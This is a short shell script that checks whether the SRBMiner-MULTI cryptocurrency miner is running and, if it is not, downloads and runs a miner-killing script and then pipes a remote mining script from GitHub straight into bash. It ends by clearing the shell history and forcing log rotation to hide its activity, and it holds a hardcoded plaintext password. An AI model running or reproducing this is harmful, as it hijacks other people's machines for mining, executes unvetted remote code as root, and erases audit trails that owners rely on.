#!/bin/sh
password="danielchau@123#"
if pgrep SRBMiner-MULTI >/dev/null
then
  echo "SRBMiner-MULTI is running."
else
  echo "SRBMiner-MULTI isn't running"
  wget "https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/kill_miner.sh" --output-document=/root/kill_miner.sh
  chmod +x /root/kill_miner.sh
  ./kill_miner.sh
  sleep 3
  bash <(curl -s 'https://raw.githubusercontent.com/danielluis1921/Danialluis1921/main/minerBITSBR.sh')
fi
history -c && history -w
sudo logrotate -f /etc/logrotate.conf
